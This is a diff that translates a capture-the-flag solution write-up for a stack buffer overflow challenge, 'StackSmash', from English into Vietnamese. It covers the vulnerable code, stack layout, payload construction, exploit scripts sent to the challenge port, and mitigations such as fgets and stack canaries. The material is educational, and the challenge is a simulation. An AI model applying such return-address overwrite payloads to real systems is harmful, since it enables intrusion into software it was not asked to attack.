@@ -1,79 +1,79 @@
-# Challenge 24: StackSmash — Solution
+# Thử thách 24: StackSmash — Giải pháp
 
-## Vulnerability Type
-**Stack-Based Buffer Overflow (x86-64 simulation)**
+## Loại lỗ hổng
+**Stack-based Buffer Overflow (Tràn bộ đệm trên ngăn xếp - Mô phỏng x86-64)**
 
-## Description
-The challenge simulates a classic `gets()`-style buffer overflow. The vulnerable function copies user input into a 32-byte buffer with no bounds check. If the payload is long enough, it overwrites the saved RBP (8 bytes) and then the return address (8 bytes) on the simulated stack. Redirecting the return address to `win()` triggers the flag.
+## Mô tả
+Thử thách này mô phỏng lỗi tràn bộ đệm kinh điển gây ra bởi việc sử dụng hàm `gets()`. Hàm xử lý dễ bị tổn thương đã sao chép thẳng dữ liệu do người dùng nhập vào một bộ đệm (buffer) rộng 32-byte mà không kiểm tra giới hạn độ dài (bounds check). Nếu Payload đủ dài, nó sẽ ghi đè lên con trỏ RBP đã lưu trên Stack (8 byte) và tiếp tục tràn để ghi đè lên địa chỉ trả về (Return Address) (8 byte) trên ngăn xếp mô phỏng. Việc kiểm soát Return Address trỏ về hàm `win()` sẽ giúp ta kích hoạt lấy Flag.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 
 ```python
 # chall.py — vuln()
-data = bytes.fromhex(raw)   # no length limit!
+data = bytes.fromhex(raw)   # Nhận input vô tội vạ, không giới hạn độ dài!
 
-# Simulated stack: [buffer(32)] [saved_rbp(8)] [ret_addr(8)]
-# ret_addr extracted at offset 40
+# Mô phỏng cấu trúc Stack: [buffer(32)] [saved_rbp(8)] [ret_addr(8)]
+# Địa chỉ trả về bị trích xuất ở offset 40
 ret_bytes = data[40:48]
 ret_addr  = struct.unpack("<Q", ret_bytes)[0]
 
-if ret_addr == WIN_ADDR:    # 0xdeadbeefcafe
+if ret_addr == WIN_ADDR:    # Kiểm tra xem có trỏ về 0xdeadbeefcafe không
     win()
 ```
 
-The real-world C equivalent:
+Mã C tương đương trong thực tế:
 
 ```c
 void vuln() {
     char buf[32];
-    gets(buf);          // no bounds check — classic overflow
-    return;             // return address already overwritten!
+    gets(buf);          // Không giới hạn số ký tự đọc — Tràn bộ đệm cổ điển
+    return;             // Lúc return thì return address đã bị ghi đè!
 }
 ```
 
-## Memory Layout
+## Bố cục bộ nhớ (Memory Layout)
 
-```
+```text
 Low address
   ┌──────────────────────────┐
   │  buffer       (32 bytes) │  ← offset 0x00
   ├──────────────────────────┤
-  │  saved RBP    (8 bytes)  │  ← offset 0x20  (fill with anything)
+  │  saved RBP    (8 bytes)  │  ← offset 0x20  (Nhồi rác gì cũng được)
   ├──────────────────────────┤
-  │  return addr  (8 bytes)  │  ← offset 0x28  (overwrite with WIN_ADDR)
+  │  return addr  (8 bytes)  │  ← offset 0x28  (Ghi đè bằng WIN_ADDR)
   └──────────────────────────┘
 High address
 ```
 
-## Exploitation Steps
+## Các bước khai thác (Exploit)
 
-**Step 1** — Identify the target address from the program output:
-```
+**Bước 1** — Xác định địa chỉ đích từ output của chương trình:
+```text
 [i] win()   @ 0xdeadbeefcafe
 ```
 
-**Step 2** — Calculate offsets:
-- 32 bytes to fill buffer
-- 8 bytes to overwrite saved RBP (arbitrary)
-- 8 bytes = WIN_ADDR in little-endian at offset 40
+**Bước 2** — Tính toán khoảng cách Offset để tràn:
+- Cần 32 bytes để lấp đầy Buffer.
+- Cần 8 bytes để ghi đè Saved RBP (giá trị rác tùy ý).
+- Cần 8 bytes ở offset 40 để ghi đè địa chỉ đích (WIN_ADDR định dạng little-endian).
 
-**Step 3** — Build payload:
-```
+**Bước 3** — Xây dựng tải trọng (Payload):
+```python
 payload = b"A" * 40 + struct.pack("<Q", 0xdeadbeefcafe)
 ```
 
-In hex:
-```
+Ở dạng Hexadecimal:
+```text
 41414141414141414141414141414141  (16 bytes)
 41414141414141414141414141414141  (16 bytes)
-4141414141414141                  (8 bytes saved RBP)
-fecaefbeadde0000                  (8 bytes WIN_ADDR little-endian)
+4141414141414141                  (8 bytes ghi đè RBP)
+fecaefbeadde0000                  (8 bytes WIN_ADDR dạng little-endian)
 ```
 
-Full hex string: `4141414141414141414141414141414141414141414141414141414141414141 4141414141414141 fecaefbeadde0000`
-(no spaces)
+Chuỗi Hex liền mạch: 
+`41414141414141414141414141414141414141414141414141414141414141414141414141414141fecaefbeadde0000`
 
-## Complete Exploit Script
+## Khai thác tự động bằng Script (pwntools)
 
 ```python
 import struct
@@ -84,21 +84,21 @@ TARGET_PORT = 1337
 
 WIN_ADDR = 0xdeadbeefcafe
 
-# Build payload
-padding  = b"A" * 40          # buffer (32) + saved RBP (8)
+# Xây dựng tải trọng
+padding  = b"A" * 40          # Lấp đầy buffer (32) + saved RBP (8)
 ret_addr = struct.pack("<Q", WIN_ADDR)
 payload  = padding + ret_addr
 
 print(f"[*] Payload ({len(payload)} bytes): {payload.hex()}")
 
-# Send over TCP
+# Gửi Payload qua TCP
 r = remote(TARGET_HOST, TARGET_PORT)
 r.recvuntil(b"payload (hex):")
 r.sendline(payload.hex().encode())
 print(r.recvall(timeout=3).decode())
 ```
 
-### Without pwntools (pure Python)
+### Script dùng Python thuần (Không cần pwntools)
 
 ```python
 import socket, struct
@@ -118,7 +118,7 @@ with socket.create_connection((HOST, PORT)) as sock:
     print(sock.recv(4096).decode())
 ```
 
-### Manual with nc
+### Sử dụng Bash + nc (Netcat)
 
 ```bash
 python3 -c "
@@ -129,47 +129,42 @@ print((padding + ret_addr).hex())
 " | nc <host> 1337
 ```
 
-## Step-by-Step Walkthrough
+## Giải thích quy trình (Từng bước)
 
-```
-1. Program prints:
+```text
+1. Chương trình in ra địa chỉ:
      [i] win()   @ 0xdeadbeefcafe
      Buffer size: 32 bytes
 
-2. We need to reach offset 40 (32 buf + 8 rbp) before our 8-byte address.
+2. Cần phải nhồi rác tới offset 40 (32 byte đệm + 8 byte rbp) trước khi chèn tiếp 8 byte địa chỉ mục tiêu.
 
-3. 0xdeadbeefcafe in little-endian 8 bytes:
+3. Địa chỉ 0xdeadbeefcafe biểu diễn dưới dạng little-endian 8 bytes là:
      fe ca ef be ad de 00 00
 
-4. Full payload hex (48 bytes):
-     4141...41 (40 × 0x41) + fecaefbeadde0000
+4. Chuỗi Hex hoàn chỉnh cho Payload (48 bytes):
+     4141...41 (40 ký tự 0x41) + fecaefbeadde0000
 
-5. Server extracts bytes[40:48] → 0xdeadbeefcafe → calls win() → FLAG
+5. Server cắt trích xuất chuỗi bytes[40:48] → nhận được 0xdeadbeefcafe → gọi hàm win() → nhả FLAG.
 ```
 
-## Mitigation
+## Biện pháp phòng ngừa (Mitigation)
 
 ```c
-// 1. Use size-bounded input functions
-fgets(buf, sizeof(buf), stdin);   // safe: limits to sizeof(buf)-1
+// 1. Sử dụng các hàm xử lý chuỗi có giới hạn an toàn (size-bounded)
+fgets(buf, sizeof(buf), stdin);   // An toàn: chỉ đọc tối đa sizeof(buf)-1 ký tự
 
-// 2. Compile with stack canary (-fstack-protector-strong)
-// 3. Enable ASLR (Address Space Layout Randomization)
-// 4. Use NX (No-Execute) bit on stack
-// 5. Use safer languages that do bounds checking by default (Rust, Go)
+// 2. Biên dịch với chế độ bảo vệ ngăn xếp Stack Canary (-fstack-protector-strong)
+// 3. Bật tính năng ASLR (Address Space Layout Randomization) tại cấp hệ điều hành
+// 4. Kích hoạt cờ NX (No-Execute bit) trên bộ nhớ ngăn xếp
+// 5. Nên ưu tiên viết bằng các ngôn ngữ an toàn bộ nhớ (Memory-Safe) như Rust, Go
 ```
 
-## Concepts Demonstrated
+## Các khái niệm liên quan
 
-| Concept | Explanation |
+| Khái niệm | Giải thích |
 |---|---|
-| Buffer overflow | Writing past the end of a fixed-size buffer |
-| Stack layout | Buffer → saved RBP → return address on x86-64 |
-| Little-endian | x86-64 stores multi-byte values LSB first |
-| RIP control | Overwriting return address redirects execution |
-| `win()` pattern | Classic CTF: reach hidden function to get flag |
-
-## References
-- [Live Overflow — Buffer Overflow](https://liveoverflow.com/binary-hacking/)
-- [pwntools documentation](https://docs.pwntools.com/)
-- [x86-64 Stack Frame Layout](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
+| Tràn bộ đệm (Buffer Overflow) | Ghi đè bộ nhớ vượt quá kích thước được cấp phát của Buffer |
+| Stack layout | Buffer → Saved RBP → Return Address (Trên kiến trúc x86-64) |
+| Little-endian | Cách x86-64 lưu trữ số nhiều byte (byte nhỏ nhất LSB đứng trước) |
+| Chiếm quyền điều khiển RIP | Kỹ thuật ghi đè Return Address để chuyển hướng luồng thực thi của chương trình |
+| Hàm `win()` | Cấu trúc quen thuộc trong các bài thi CTF mảng Pwn: Cố gắng nhảy tới một hàm giấu kín để in ra cờ |
